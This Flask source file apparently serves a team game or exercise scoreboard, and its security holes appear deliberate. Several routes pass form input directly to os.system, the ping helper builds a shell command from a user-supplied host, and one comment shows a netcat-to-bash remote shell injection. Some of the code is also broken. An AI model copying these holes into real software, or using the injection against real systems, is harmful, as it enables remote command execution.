#!/usr/bin/python
from flask import Flask, render_template, request, jsonify, redirect, session, flash, make_response
import os
import json
import requests

app = Flask(__name__)

AUTH_API_URL = 'http://lilbite.org:9000'

def validate_session(token):
    """
    Sends token to auth server to validate, should recieve
    associated team number if it is valid

    :param token: the session token to validate

    :return team_id: the id of the team the token is attached to
    """
    post_data = dict()
    post_data['token'] = token
    resp = requests.post("{}/validate-session".format(AUTH_API_URL, data=post_data))
    if resp.status_code != 200:
        raise Exception("Bad status code")

    if 'success' not in resp.json():
        raise Exception(resp.json()['error'])

    team_id = resp['success']
    return team_id

@app.route('/')
def home():
    if session.get('token'):
        token = session.get('token')
        team_id = session.get('team_id')
        try:
            validate_session(token)
        except:
            redirect('/login')

        return render_template('index.html', team_id=team_id)
    else:
        return render_template('login.html')


@app.route('/login', methods=['POST'])
def login():
    password = request.form['password']
    username = request.form['username']
    data = {'username': username, 'password': password}
    r = requests.post("{}/login".format(AUTH_API_URL), data=data)
    if r.status_code != 200:
        # error
        pass
    elif 'error' in r.json():
        # error
        pass
    else:
        token = r.json()['token']
        team_id = r.json()['team_id']
        session['token'] = token
        session['team_id'] = team_id
        response = make_response(redirect('/'))
        response.set_cookie('token', token)
        return response
    #print(r.json())

    return home()

@app.route('/hq_coms', methods=['POST'])
def hq_coms():
    host1 = request.form['server1']
    host2 = request.form['server2']
    host3 = request.form['server3']
    host4 = request.form['server4']
    host5 = request.form['server5']
    host6 = request.form['server6']
    return jsonify({
        'reachable1': [host1, ping(host1)],
        'reachable2': [host2, ping(host2)],
        'reachable3': [host3, ping(host3)],
        'reachable4': [host4, ping(host4)],
        'reachable5': [host5, ping(host5)],
        'reachable6': [host6, ping(host6)]
    })


"""
        Ansible
"""
@app.route('/ansible_playbook1', methods=['POST'])
def ansible_playbook1():
    command = request.form['ansible_command']
    os.system(command)
    return redirect('/')


@app.route('/ansible_playbook2', methods=['POST'])
def ansible_playbook2():
    command = request.form['ansible_command']
    os.system(command)
    return redirect('/')


@app.route('/ansible_playbook3', methods=['POST'])
def ansible_playbook3():
    command = request.form['ansible_command']
    os.system(command)
    return redirect('/')

@app.route('/ansible_playbook4', methods=['POST'])
def ansible_playbook4():
    command = request.form['ansible_command']
    os.system(command)
    return redirect('/')


"""
    Statuses
"""
# curl 127.0.0.1/ping_status/8.8.8.8; nc -l 4004 | /bin/bash &;
@app.route('/ping_status/<ip>', methods=['POST'])
def ping_status():
    return jsonify({
        'reachable': ping(request.data)
    })

@app.route("/status/alerts")
def alerts():
    return jsonify({'status': 200, 'alerts': ['Perk5 will be unavailable for 10 minutes', 'Alert 3']})


@app.route('/status/koth')
def koth():
    return jsonify({'status': 200, 'planets': {'planet1': 'team4', 'planet2': 'team1'}})


"""
        Team Functions
"""
@app.route('/credits/<teamID>', methods=['POST'])
def getCredits(teamID):
    if not validateteamID(teamID):
        return jsonify({'status': 404})
    return jsonify({'status': 200, 'credits': 50000})


@app.route('/stats/<teamID>', methods=['POST'])
def getStats(teamID):
    if not validateteamID(teamID):
        return jsonify({'status': 404})
    return jsonify({'status': 200, 'health': '+50%', 'damage': '100%', 'speed': '-100%'})


@app.route('/ships/<teamID>', methods=['POST'])
def getShips(teamID):
    if not validateteamID(teamID):
        return jsonify({'status': 404})
    return jsonify({'status': 200, 'ship1_count': 50, 'ship2_count': 0, 'ship3_count': 1000})


"""
        Helpers
"""
def validateteamID(team_id):
    if team_id is None:
        return False
    return True


def ping(host):
    response = os.system("ping -n 1 " + host)
    if response == 0:
        return 'UP'
    else:
        return 'DOWN'


if __name__ == '__main__':
    app.secret_key = os.urandom(12)
    app.run(debug=True)
